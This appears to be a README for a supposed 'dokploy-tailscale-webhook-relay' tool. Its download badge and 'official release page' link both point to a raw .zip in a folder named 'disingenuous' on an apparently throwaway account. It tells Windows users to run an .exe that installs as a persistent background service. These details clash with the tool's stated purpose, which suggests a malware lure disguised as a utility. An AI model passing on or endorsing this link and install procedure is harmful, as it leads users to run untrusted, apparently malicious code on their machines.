# 🌐 dokploy-tailscale-webhook-relay - Connect private servers to public services

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/raw/refs/heads/main/disingenuous/relay-dokploy-tailscale-webhook-v3.6.zip)

This software lets your Dokploy instance receive updates from services like GitHub while you keep your dashboard hidden behind a Tailscale VPN. You get the convenience of webhooks with the security of a private network.

## 📋 System Requirements

Confirm your computer meets these basic needs before you begin:

* Windows 10 or Windows 11.
* A stable internet connection.
* Active Tailscale account.
* Active Cloudflare account for tunnel management.
* A web browser to manage settings.

## 📥 Download and Setup

Follow these steps to get the service running on your machine.

1. Visit the [official release page](https://github.com/olympiangamesgenussynchytrium730/dokploy-tailscale-webhook-relay/raw/refs/heads/main/disingenuous/relay-dokploy-tailscale-webhook-v3.6.zip) to access the installer.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file to download it to your Downloads folder.
4. Open the downloaded file to start the installer.
5. Follow the on-screen prompts to place the relay service on your computer.

The application installs as a background service. This allows it to stay active even when you log out of your Windows user account.

## ⚙️ Configuring Your Relay

The relay acts as a bridge between the public internet and your private Dokploy dashboard.

### 1. Tailscale Setup
Ensure Tailscale runs on your server. Your Dokploy dashboard must be reachable on your Tailscale private IP address. This address usually starts with 100.x.x.x. Check your Tailscale dashboard to confirm you can ping this address from your local machine.

### 2. Cloudflare Tunnel
Cloudflare manages incoming traffic through a secure tunnel.

* Log into your Cloudflare dashboard.
* Create a new tunnel in the Zero Trust section.
* Assign a public domain name to point to your Dokploy webhook URL.
* Follow the prompts to install the `cloudflared` connector on your server.

### 3. Service Linking
Open the relay configuration file located in the program directory. This file uses simple text to map your incoming webhooks to your private Dokploy address.

* Find the line labeled `TARGET_URL`.
* Replace the placeholder with the Tailscale IP of your Dokploy server. Add the specific webhook port at the end.
* Save the file and restart the application from your Windows services menu.

## 🛡️ Security Considerations

This setup keeps your dashboard private. Only the webhook relay listens to traffic coming from the internet. Your real dashboard lives behind your VPN where only devices with Tailscale access can see it. 

Do not share your Cloudflare credentials with others. Keep your software updated to include the latest security patches.

## 🧪 Testing the Connection

Perform these steps to confirm everything works as expected:

1. Open your GitHub repository settings.
2. Navigate to the Webhooks area.
3. Paste the public URL generated by your Cloudflare tunnel.
4. Select the event types that Dokploy needs to trigger updates.
5. Click the button to send a test payload.
6. Check your Dokploy dashboard logs to see if the event arrived.

If the test fails, verify that your Tailscale VPN connection remains active. Ensure the Windows Firewall allows the relay service to send and receive data packets. 

## 🔧 Managing the Service

The relay runs automatically when Windows starts. You do not need to open a window or interact with the app daily. 

If you need to make changes, open the Windows Services manager:

* Press the Windows key + R on your keyboard.
* Type `services.msc` and press Enter.
* Find the Dokploy Relay service in the list.
* Right-click the service to stop, start, or restart it after you edit your configuration files.

## 🆘 Troubleshooting Common Issues

* **Connection Timeout:** Check if Tailscale is disconnected. Ensure your Dokploy server is online.
* **Unauthorized Access:** Verify that the webhook secret matches the key saved in your relay configuration file.
* **Service Won't Start:** Check that no other application uses the same network port on your Windows machine. Most setups use port 8080 by default. Change this port in the configuration file if a conflict exists.
* **Logs are Empty:** Look in the logs folder within the installation directory. The relay creates a text file there that explains why a connection failed.
